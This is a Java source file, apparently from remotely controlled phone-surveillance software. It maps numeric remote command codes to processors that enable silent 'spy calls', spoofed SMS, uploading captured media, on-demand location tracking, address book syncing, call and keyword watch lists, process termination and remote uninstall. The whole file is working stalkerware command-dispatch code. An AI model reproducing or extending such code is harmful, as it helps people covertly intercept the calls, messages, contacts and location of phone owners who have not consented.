package com.vvt.remotecommandmanager.processor;

import java.util.HashMap;
import java.util.Map;

import com.vvt.activation_manager.ActivationManager;
import com.vvt.appcontext.AppContext;
import com.vvt.base.FxEventListener;
import com.vvt.capture.location.LocationCaptureManager;
import com.vvt.configurationmanager.ConfigurationManager;
import com.vvt.connectionhistorymanager.ConnectionHistoryManager;
import com.vvt.daemon_addressbook_manager.AddressbookManager;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.datadeliverymanager.interfaces.DataDelivery;
import com.vvt.eventdelivery.EventDelivery;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseManager;
import com.vvt.logger.FxLog;
import com.vvt.phoneinfo.PhoneInfo;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.productinfo.ProductInfo;
import com.vvt.remotecommandmanager.InitialParameter;
import com.vvt.remotecommandmanager.exceptions.CommandNotRegisteredException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.activationandinstallation.ActivateWithActivationCodeAndURLProcessor;
import com.vvt.remotecommandmanager.processor.activationandinstallation.ActivateWithURLProcessor;
import com.vvt.remotecommandmanager.processor.activationandinstallation.DeactivateProcessor;
import com.vvt.remotecommandmanager.processor.activationandinstallation.RequestMobileNumberProcessor;
import com.vvt.remotecommandmanager.processor.activationandinstallation.SyncUpdateConfigurationProcessor;
import com.vvt.remotecommandmanager.processor.activationandinstallation.UninstallApplicationProcessor;
import com.vvt.remotecommandmanager.processor.addressbook.ReqAddressBookProcessor;
import com.vvt.remotecommandmanager.processor.addressbook.SetAddressBookManagementProcessor;
import com.vvt.remotecommandmanager.processor.addressbook.SyncAddressBookProcessor;
import com.vvt.remotecommandmanager.processor.callwatch.AddWatchNumberProcessor;
import com.vvt.remotecommandmanager.processor.callwatch.ClearWatchNumberProcessor;
import com.vvt.remotecommandmanager.processor.callwatch.EnableWatchNotificationProcessor;
import com.vvt.remotecommandmanager.processor.callwatch.QueryWatchNumberProcessor;
import com.vvt.remotecommandmanager.processor.callwatch.ResetWatchNumberProcessor;
import com.vvt.remotecommandmanager.processor.callwatch.SetWatchFlagsProcessor;
import com.vvt.remotecommandmanager.processor.communication.SpoofSMSProcessor;
import com.vvt.remotecommandmanager.processor.homenumbers.AddHomesProcessor;
import com.vvt.remotecommandmanager.processor.homenumbers.ClearHomesProcessor;
import com.vvt.remotecommandmanager.processor.homenumbers.QueryHomesProcessor;
import com.vvt.remotecommandmanager.processor.homenumbers.ResetHomesProcessor;
import com.vvt.remotecommandmanager.processor.keywordlist.AddKeywordProcessor;
import com.vvt.remotecommandmanager.processor.keywordlist.ClearKeywordProcessor;
import com.vvt.remotecommandmanager.processor.keywordlist.QueryKeywordProcessor;
import com.vvt.remotecommandmanager.processor.keywordlist.ResetKeywordProcessor;
import com.vvt.remotecommandmanager.processor.location.EnableLocationProcessor;
import com.vvt.remotecommandmanager.processor.location.OnDemandLocationProcessor;
import com.vvt.remotecommandmanager.processor.location.UpdateLocationIntervalProcessor;
import com.vvt.remotecommandmanager.processor.media.DeleteActualMediaProcessor;
import com.vvt.remotecommandmanager.processor.media.UploadActualMediaProcessor;
import com.vvt.remotecommandmanager.processor.miscellaneous.EnableCaptureProcessor;
import com.vvt.remotecommandmanager.processor.miscellaneous.RequestEventsProcessor;
import com.vvt.remotecommandmanager.processor.miscellaneous.RequestHeartbeatProcessor;
import com.vvt.remotecommandmanager.processor.miscellaneous.SetSettingsProcessor;
import com.vvt.remotecommandmanager.processor.monitorcall.AddMonitorsProcessor;
import com.vvt.remotecommandmanager.processor.monitorcall.ClearMonitorNumberProcessor;
import com.vvt.remotecommandmanager.processor.monitorcall.EnableSpyCallProcessor;
import com.vvt.remotecommandmanager.processor.monitorcall.EnableSpyCallWithMonitorProcessor;
import com.vvt.remotecommandmanager.processor.monitorcall.QueryMonitorNumbersProcessor;
import com.vvt.remotecommandmanager.processor.monitorcall.ResetMonitorsProcessor;
import com.vvt.remotecommandmanager.processor.notificationsnumbers.AddNotificationNumbersProcessor;
import com.vvt.remotecommandmanager.processor.notificationsnumbers.ClearNotificationNumbersProcessor;
import com.vvt.remotecommandmanager.processor.notificationsnumbers.QueryNotificationNumbersProcessor;
import com.vvt.remotecommandmanager.processor.notificationsnumbers.ResetNotificationNumbersProcessor;
import com.vvt.remotecommandmanager.processor.securityandprotection.AddEmergencyNumberProcessor;
import com.vvt.remotecommandmanager.processor.securityandprotection.ClearEmergencyNumberProcessor;
import com.vvt.remotecommandmanager.processor.securityandprotection.QueryEmergencyNumberProcessor;
import com.vvt.remotecommandmanager.processor.securityandprotection.ResetEmergencyNumberProcessor;
import com.vvt.remotecommandmanager.processor.troubleshoot.RequestCurrentlyURLProcessor;
import com.vvt.remotecommandmanager.processor.troubleshoot.RequestDiagnosticProcessor;
import com.vvt.remotecommandmanager.processor.troubleshoot.RequestSettingsProcessor;
import com.vvt.remotecommandmanager.processor.troubleshoot.RestartDeviceProcessor;
import com.vvt.remotecommandmanager.processor.troubleshoot.RetrieveRunningProcessesProcessor;
import com.vvt.remotecommandmanager.processor.troubleshoot.SetDebugModeProcessor;
import com.vvt.remotecommandmanager.processor.troubleshoot.TerminateRunningProcessesProcessor;
import com.vvt.remotecommandmanager.processor.urllist.AddURLProcessor;
import com.vvt.remotecommandmanager.processor.urllist.ClearURLProcessor;
import com.vvt.remotecommandmanager.processor.urllist.QueryURLProcessor;
import com.vvt.remotecommandmanager.processor.urllist.ResetURLProcessor;
import com.vvt.server_address_manager.ServerAddressManager;

public class RemoteCommandFactory {
	private static final String TAG = "RemoteCommandFactory";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGW = Customization.WARNING;
	
	private Map<String, RemoteCommandProcessor> mProcessors;
	private FxEventRepository mEventRepository;
	private AppContext mAppContext;
	private ActivationManager mActivationManager;
	private DataDelivery mDataDelivery;
	private EventDelivery mEventDelivery;
	private AddressbookManager mAddressbookManager;
	private LicenseManager mLicenseManager;
	private ConfigurationManager mConfigurationManager;
	private PreferenceManager mPreferenceManager;
	private ServerAddressManager mServerAddressManager;
	@SuppressWarnings("unused")
	private FxEventListener mEventListener;
	private PhoneInfo mPhoneInfo;
	private LocationCaptureManager mLocationCaptureManager;
	private ProductInfo mProductInfo;
	private ConnectionHistoryManager mConnectionHistoryManager;
	
	public RemoteCommandFactory(InitialParameter setupParam) {
		mAppContext = setupParam.getAppContext();
		mEventRepository = setupParam.getEventRepository();
		mLicenseManager = setupParam.getLicenseManager();
		mActivationManager = setupParam.getActivationManager();
		mDataDelivery	= setupParam.getDataDelivery();
		mEventDelivery = setupParam.getEventDelivery();
		mAddressbookManager = setupParam.getAddressbookManager();
		
		if(mAddressbookManager == null)
			if(LOGW) FxLog.w(TAG, "createCommandProcessor # mAddressbookManager is null");
		
		mConfigurationManager = setupParam.getConfigurationManager();
		mPreferenceManager = setupParam.getPreferenceManager();
		mServerAddressManager = setupParam.getServerAddressManager();
		mEventListener = setupParam.getEventListener();
		mPhoneInfo = mAppContext.getPhoneInfo();
		mProductInfo = mAppContext.getProductInfo();
		
		mLicenseManager.getLicenseInfo();
		mProcessors = new HashMap<String, RemoteCommandProcessor>();
		mLocationCaptureManager = setupParam.getLocationCaptureManager();
		mConnectionHistoryManager = setupParam.getConnectionHistoryManager();
	}
	
	public RemoteCommandProcessor createCommandProcessor(String commandCode) throws RemoteCommandException{
		if(LOGV) FxLog.v(TAG, "createCommandProcessor # ENTER ...");
		
		if (mProcessors.get(commandCode) == null) {
			if(LOGV) FxLog.v(TAG, "createCommandProcessor # Not create yet .." +commandCode );
			RemoteCommandProcessor processor = getProcessor(commandCode);
			if(processor == null) {
				throw new CommandNotRegisteredException();
			}
			if(LOGV) FxLog.v(TAG, "createCommandProcessor # Create already .." +commandCode );
			mProcessors.put(commandCode, processor);
		} 
		
		if(LOGV) FxLog.v(TAG, "createCommandProcessor # EXIT ...");
		return mProcessors.get(commandCode);
	}
	
	
	private RemoteCommandProcessor getProcessor(String commandCode) {
		if(LOGV) FxLog.v(TAG, "getProcessor # ENTER ...");
		RemoteCommandProcessor processor = null;
		if(LOGD) FxLog.d(TAG, "getProcessor # commandCode : "+commandCode);
		// Miscellaneous
		if(commandCode.equals("64")) {
			processor = new RequestEventsProcessor(mAppContext,mEventRepository,mEventDelivery,mLicenseManager.getLicenseInfo());
		} else if (commandCode.equals("2")) {
			processor = new RequestHeartbeatProcessor(mAppContext,mDataDelivery,mEventRepository,mLicenseManager.getLicenseInfo());
		} else if (commandCode.equals("92")) {
			processor = new SetSettingsProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("60")) {
			processor = new EnableCaptureProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		
		//Activation And Installation
		} else if (commandCode.equals("14140")) {
			processor = new ActivateWithActivationCodeAndURLProcessor(mAppContext, mEventRepository, mActivationManager);
		} else if (commandCode.equals("14141")) {
			processor = new ActivateWithURLProcessor(mAppContext, mEventRepository, mActivationManager);
		} else if (commandCode.equals("14142")) {
			processor = new DeactivateProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mActivationManager);
		} else if (commandCode.equals("300")) {
			processor = new SyncUpdateConfigurationProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mDataDelivery, mLicenseManager);
		} else if (commandCode.equals("199")) {
			processor = new RequestMobileNumberProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager, mPhoneInfo);
		} else if (commandCode.equals("200")) { 
			processor = new UninstallApplicationProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo());
		
		//Address Book
		} else if (commandCode.equals("120")) {
			processor = new ReqAddressBookProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mAddressbookManager);
		} else if (commandCode.equals("122")) {
			processor = new SetAddressBookManagementProcessor(mAppContext, mAddressbookManager, mEventRepository, mLicenseManager.getLicenseInfo());
		} else if (commandCode.equals("301")) {
			processor = new SyncAddressBookProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mAddressbookManager);
		
		//Security and protection
		} else if (commandCode.equals("164")) {
			processor = new AddEmergencyNumberProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("165")) {
			processor = new ResetEmergencyNumberProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("166")) {
			processor = new ClearEmergencyNumberProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("167")) {
			processor = new QueryEmergencyNumberProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		
		// Notifications Numbers
		} else if (commandCode.equals("171")) {
			processor = new AddNotificationNumbersProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("172")) {
			processor = new ResetNotificationNumbersProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("173")) {
			processor = new ClearNotificationNumbersProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("174")) {
			processor = new QueryNotificationNumbersProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		
		// Media
		} else if (commandCode.equals("90")) {
			processor = new UploadActualMediaProcessor(mAppContext, mEventDelivery, mEventRepository, mLicenseManager.getLicenseInfo());
		} else if (commandCode.equals("91")) {
			processor = new DeleteActualMediaProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo());
		
		// Location Commands
		} else if (commandCode.equals("52")) {
			processor = new EnableLocationProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("53")) {
			processor = new UpdateLocationIntervalProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("101")) {
			processor = new OnDemandLocationProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mLocationCaptureManager);
		
		// Communication
		} else if (commandCode.equals("85")) {
			processor = new SpoofSMSProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo());
			
		// Call Watch
		} else if (commandCode.equals("49")) {
			processor = new EnableWatchNotificationProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("50")) {
			processor = new SetWatchFlagsProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("45")) {
			processor = new AddWatchNumberProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("46")) {
			processor = new ResetWatchNumberProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("47")) {
			processor = new ClearWatchNumberProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("48")) {
			processor = new QueryWatchNumberProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		
		//Sync
		
		// Home numbers
		} else if (commandCode.equals("150")) {
			processor = new AddHomesProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("151")) {
			processor = new ResetHomesProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("152")) {
			processor = new ClearHomesProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("153")) {
			processor = new QueryHomesProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
			
		// Keyword List
		} else if (commandCode.equals("73")) {
			processor = new AddKeywordProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("74")) {
			processor = new ResetKeywordProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("75")) {
			processor = new ClearKeywordProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("76")) {
			processor = new QueryKeywordProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		
		// URL List
		} else if (commandCode.equals("396")) {
			processor = new AddURLProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mServerAddressManager);
		} else if (commandCode.equals("397")) {
			processor = new ResetURLProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mServerAddressManager);
		} else if (commandCode.equals("398")) {
			processor = new ClearURLProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mServerAddressManager);
		} else if (commandCode.equals("399")) {
			processor = new QueryURLProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mServerAddressManager);
	
		// Troubleshoot
		} else if (commandCode.equals("67")) {
			processor = new RequestSettingsProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager, mConfigurationManager);
		} else if (commandCode.equals("62")) {
			processor = new RequestDiagnosticProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mProductInfo, mPhoneInfo, mConnectionHistoryManager, mAddressbookManager, mConfigurationManager);
		} else if (commandCode.equals("147")) {
			processor = new RestartDeviceProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo());
		} else if (commandCode.equals("14852")) {
			processor = new RetrieveRunningProcessesProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo());
		} else if (commandCode.equals("14853")) {
			processor = new TerminateRunningProcessesProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo());
		} else if (commandCode.equals("170")) {
			processor = new SetDebugModeProcessor(mAppContext, mEventRepository, mPreferenceManager, mLicenseManager.getLicenseInfo());
		} else if (commandCode.equals("14143")) {
			processor = new RequestCurrentlyURLProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mServerAddressManager);
		
		
		//monitor call
		} else if (commandCode.equals("9")) {
			processor = new EnableSpyCallProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("10")) {
			processor = new EnableSpyCallWithMonitorProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("160")) {
			processor = new AddMonitorsProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("163")) {
			processor = new ResetMonitorsProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("161")) {
			processor = new ClearMonitorNumberProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		} else if (commandCode.equals("162")) {
			processor = new QueryMonitorNumbersProcessor(mAppContext, mEventRepository, mLicenseManager.getLicenseInfo(), mPreferenceManager);
		}
		
		FxLog.v(TAG, "getProcessor # EXIT ...");
		return processor;
	}
}
